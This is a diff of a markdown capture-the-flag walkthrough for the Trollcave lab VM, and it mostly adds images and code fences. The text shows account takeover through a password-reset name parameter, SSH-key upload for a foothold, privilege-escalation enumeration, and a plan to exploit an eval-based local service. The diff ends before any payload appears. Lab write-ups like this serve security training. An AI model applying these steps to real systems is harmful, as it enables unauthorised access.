@@ -147,7 +147,7 @@ http://192.168.251.9/password_resets/new
 
 It sends the link
 
-
+![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
 
 Note the end of the string has the parameter [name]. We'll abuse this part.
 Since we already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
@@ -156,7 +156,7 @@ Since we already know all the users. How about resetting password for King `http
 
 
 Once we're logged in we go to admin panel and enable file upload 
-
+![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-6.png)
 
 
 Reading through the user King blogs we come across
@@ -176,14 +176,12 @@ Generate a ssh key as follows
 Upload the key as follows:
 Note we'll upload with user as xer upload as King don't work:
 
-
-
-ssh -i trollcave rails@192.168.251.9
+	ssh -i trollcave rails@192.168.251.9
 
 We'll run LinEnum and les.
 
 We'll use LinEnum. The user king has sudo rights  `.sudo_as_admin_successful`
-
+```
 rails@trollcave:~$ ls -lah /home/king/
 total 32K
 drwxr-xr-x 4 king king 4.0K Mar 21  2018 .
@@ -195,11 +193,9 @@ drwx------ 2 king king 4.0K Sep 16  2016 .cache
 drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 -rw-r--r-- 1 king king  675 Sep 16  2016 .profile
 -rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
-
-He's running a program called 
 ```
-drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
-
+He's running a program called  calc
+```
 rails@trollcave:/home/king/calc$ cat calc.js
 var http = require("http");
 var url = require("url");
@@ -296,7 +292,7 @@ console.log("Server started");
 
 Its tells us its running on 8888.
 Confirmed by, 
-
+```
 [-] Listening TCP:
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -307,6 +303,7 @@ tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      - 
 tcp6       0      0 :::22                   :::*                    LISTEN      - 
 tcp6       0      0 ::1:5432                :::*                    LISTEN      - 
+```
 
 Taking a closer look at this function it uses the eval function. According this [site][5] it's advises against using the eval function as it is exploitable; we'll go ahead and exploit it 
 
